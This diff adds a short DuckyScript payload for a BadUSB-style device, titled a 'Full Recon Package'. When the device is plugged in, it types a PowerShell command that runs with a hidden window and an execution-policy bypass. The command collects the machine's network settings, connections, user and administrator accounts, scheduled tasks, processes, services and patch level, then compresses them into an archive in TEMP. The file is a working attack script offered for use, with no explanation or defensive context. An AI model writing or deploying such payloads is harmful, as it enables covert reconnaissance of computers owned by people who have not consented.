@@ -1,0 +1,7 @@
+REM CYBERFLIPPER - ADVANCED Level
+REM Full Recon Package - Comprehensive system enumeration
+DELAY 500
+GUI r
+DELAY 300
+STRING powershell -W Hidden -EP Bypass -C "$d=\"$env:TEMP\full_recon\";md $d -F;ipconfig /all>\"$d\net.txt\";route print>\"$d\routes.txt\";netstat -ano>\"$d\conn.txt\";net user>\"$d\users.txt\";net localgroup administrators>\"$d\admins.txt\";schtasks /query /fo csv>\"$d\tasks.csv\";Get-Process|Export-Csv \"$d\procs.csv\" -NoType;Get-Service|Export-Csv \"$d\svcs.csv\" -NoType;Get-HotFix|Export-Csv \"$d\patches.csv\" -NoType;Compress-Archive $d \"$d.zip\" -Force;explorer $d"
+ENTER
